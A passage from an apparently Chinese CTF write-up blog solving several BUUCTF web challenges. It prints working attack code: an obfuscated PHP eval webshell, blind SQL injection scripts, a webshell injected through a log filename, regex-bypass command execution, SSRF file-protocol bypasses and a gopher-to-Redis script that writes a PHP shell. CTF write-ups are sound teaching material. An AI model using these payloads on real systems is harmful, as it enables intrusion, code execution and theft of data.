class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">'assert'</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$a).<span class="string">"\n"</span>;</span><br><span class="line">$b=<span class="string">'(eval($_POST[y]))'</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$b).<span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">#%9E%8C%8C%9A%8D%8B</span></span><br><span class="line"><span class="comment">#%D7%9A%89%9E%93%D7%A0%AF%B0%AC%AB%A4%86%A2%D6%D6</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一句话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%86%A2%D6%D6);</span><br><span class="line">密码：y</span><br></pre></td></tr></table></figure><p>看到根目录下存在flag和readflag文件.应该是通过执行readflag来读取flag，但是这里的shell命令基本上都被禁了。可以通过蚁剑的绕过disable_functions来执行<br>这里选择PHP_GC_UAF<br><img src="../../images/ctf/buuctf/25.jpg" alt=""></p><h1 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h1><p>输入1 成绩100<br>输入2 成绩666<br>输入2-1 成绩100     </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url= <span class="string">'http://763ada9b-220d-4dcb-b0e5-2f4a21bd2544.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line">database =<span class="string">""</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"?stunum=1^(ascii(substr((select(database())),&#123;&#125;,1))&gt;&#123;&#125;)^1"</span> <span class="comment">#库名为ctf</span></span><br><span class="line">payload2 = <span class="string">"?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),&#123;&#125;,1))&gt;&#123;&#125;)^1"</span><span class="comment">#表名为flag,score</span></span><br><span class="line">payload3 =<span class="string">"?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),&#123;&#125;,1))&gt;&#123;&#125;)^1"</span> <span class="comment">#列名为flag,value</span></span><br><span class="line">payload4 = <span class="string">"?stunum=(ascii(substr((select(group_concat(value))from(ctf.flag)),&#123;&#125;,1))&gt;&#123;&#125;)"</span> <span class="comment">#</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>,<span class="number">10000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid =(low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high):</span><br><span class="line">        <span class="comment"># payload = payload1.format(i,mid)  #查库名</span></span><br><span class="line">        <span class="comment"># payload = payload2.format(i,mid)  #查表名</span></span><br><span class="line">        <span class="comment"># payload = payload3.format(i,mid)  #查列名</span></span><br><span class="line">        payload = payload4.format(i,mid) <span class="comment">#查flag</span></span><br><span class="line">        new_url = url + payload</span><br><span class="line">        r = requests.get(new_url)</span><br><span class="line">       <span class="comment"># print(new_url)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hi admin"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    database +=chr(mid)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line">print(database)</span><br></pre></td></tr></table></figure><h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h1><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are going to the next ~"</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br><span class="line">``` </span><br><span class="line">[利用PHP的字符串解析特性Bypass](https:<span class="comment">//www.freebuf.com/articles/web/213359.html)  </span></span><br><span class="line">PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</span><br><span class="line">```bash</span><br><span class="line"><span class="number">1.</span>删除空白符</span><br><span class="line"><span class="number">2.</span>将某些字符转换为下划线（包括空格）</span><br></pre></td></tr></table></figure><p>可以用%20代替下划线从而绕过第一个if<br>第二个if中正则匹配表示匹配字符窜的开头和结尾<br>由于在字符窜中换行可以表示字符窜的结尾，所以可以用%0a(换行符的url编码)绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b%20u%20p%20t=23333a</span><br></pre></td></tr></table></figure><p>访问secrettw.php    </p><p>解码jsfuck，得到alert(“post me Merak”<br>post Merak 得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反写chnage</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span><span class="params">($v)</span></span>&#123; </span><br><span class="line"></span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$real_flag = unchange(<span class="string">'flag.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode($real_flag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</span><br><span class="line"></span><br><span class="line">http头</span><br><span class="line">Client-ip : 127.0.0.1</span><br></pre></td></tr></table></figure><h1 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h1><p>用题目提供的用户密码cookie / monster 登陆，查看cookie，将username修改为admin</p><h1 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h1><p>访问robots.txt，得知有bak备份<br>image.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>addslashes()函数，这个函数会把特殊的字符转义。</p><p>比如:单引号会被转义成&#39;,斜杠会转义为\.</p><p>第十行的str_replace会把”\0”,”%00”,”\‘“,”‘“中的任意一个替换成空。</p><p>我们可根据这个绕过当传入id=\0时，就会在 查询语句处改变sql语句。</p><p>即:select * from images where id=’ &#39; or path=’+{$path}’</p><p>所以我们可以在path处注入我们的新语句，</p><p>由于没有查询结果回显，所以此处是盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://18d42f36-2704-43a9-8690-b52a3c0a95e8.node3.buuoj.cn/image.php?id=\\0&amp;path=or 1="</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">last=<span class="string">"tmp"</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>( last != result ):</span><br><span class="line">i=i+<span class="number">1</span></span><br><span class="line">head=<span class="number">32</span></span><br><span class="line">tail=<span class="number">127</span></span><br><span class="line"><span class="keyword">while</span> head &lt; tail :</span><br><span class="line">mid = ( head + tail ) &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="comment">#payload = "if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),%d,1))&gt;%d,1,-1)%%23"%(i,mid)</span></span><br><span class="line"><span class="comment">#payload = "if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),%d,1))&gt;%d,1,-1)%%23"%(i,mid)</span></span><br><span class="line">payload = <span class="string">"if(ascii(substr((select group_concat(password) from users),%d,1))&gt;%d,1,-1)%%23"</span>%(i,mid)</span><br><span class="line"><span class="comment">#print(url+payload)</span></span><br><span class="line">r = requests.get(url+payload)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b"JFIF"</span> <span class="keyword">in</span> r.content :</span><br><span class="line">head = mid + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tail = mid</span><br><span class="line">            </span><br><span class="line">last = result</span><br><span class="line"><span class="keyword">if</span> chr(head)!=<span class="string">' '</span> :</span><br><span class="line">result += chr(head)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>这里会将文件名和用户名写入日志文件。但是这里日志文件为php格式，考虑写入shell。由于用户名只能为admin无法利用，考虑文件名注入。文件名进行了php/i过滤，可以使用短标签绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=<span class="string">"&lt;?=@eval(<span class="variable">$_POST</span>['a']);?&gt;"</span></span><br></pre></td></tr></table></figure><p>这个文件名，会被写入日志文件中去，然后用菜刀连接。</p><h1 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h1><p>json属性字段一定要用双引号括起来，单引号是不可以的。      <a href="https://xz.aliyun.com/t/5399" target="_blank" rel="noopener">https://xz.aliyun.com/t/5399</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">'PATH=/home/rceservice/jail'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Attempting to run command:&lt;br/&gt;'</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="keyword">true</span>)[<span class="string">'cmd'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="keyword">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">'Invalid input'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;&lt;br/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是他用的是preg_match()函数，只匹配一行，用个换行符搞定</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A<span class="string">"cmd"</span>: <span class="string">"ls /"</span>%0A&#125;</span><br></pre></td></tr></table></figure><p>并没有flag</p><p>在这里插入图片描述<br>这里提供了路径，暂时明白为啥可以ls了，因为ls的二进制文件放在这个目录下了</p><p>看看这个路径都有啥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A<span class="string">"cmd"</span>: <span class="string">"ls /home/rceservice"</span>%0A&#125;</span><br></pre></td></tr></table></figure><p>发现flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0A<span class="string">"cmd"</span>:<span class="string">"/bin/cat%20/home/rceservice/flag"</span>%0A&#125;</span><br></pre></td></tr></table></figure><h1 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h1><p>查看源码，提示 ?secret,访问得一些 ip 信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">eth0      Link encap:Ethernet  HWaddr 02:42:0a:dd:75:09  </span><br><span class="line">          inet addr:10.221.117.9  Bcast:10.221.117.255  Mask:255.255.255.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1</span><br><span class="line">          RX packets:138 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:137 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:29124 (29.1 KB)  TX bytes:29110 (29.1 KB)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 02:42:ac:12:00:3b  </span><br><span class="line">          inet addr:172.18.0.59  Bcast:172.18.255.255  Mask:255.255.0.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:85 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:27 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:21931 (21.9 KB)  TX bytes:1640 (1.6 KB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:34 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:34 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:2927 (2.9 KB)  TX bytes:2927 (2.9 KB)</span><br></pre></td></tr></table></figure><p>得知有srrf漏洞，file://协议被过滤了，用发现file协议被过滤了，我们可以尝试绕过：file：/、file:&lt;空格&gt;///</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=file:/var/www/html/index.php</span><br><span class="line">?url=file:%20///var/www/html/index.php</span><br></pre></td></tr></table></figure><p>得知index.php漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="comment">//echo $url."\n";</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is'</span>, $url,$match))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//var_dump($match);</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">'鍒繖鏍�'</span>);</span><br><span class="line">&#125;</span><br><span class="line">curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'secret'</span>]))&#123;</span><br><span class="line">system(<span class="string">'ifconfig'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>bp跑一下 10.55.109.9 c 段主机，<br><img src="../../images/ctf/buuctf/26.jpg" alt=""><br>跑一下 10.55.109.11的端口，或直接试一试常见的端口6379/3306<br>后面就直接写shell   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"10.55.109.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php system('cat /flag');?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"<span class="variable">$&#123;IFS&#125;</span>"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(0,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line">def redis_format(arr):</span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"<span class="variable">$&#123;IFS&#125;</span>"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"<span class="variable">$&#123;IFS&#125;</span>"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="built_in">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.request.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span>(urllib.request.quote(payload))    <span class="comment"># 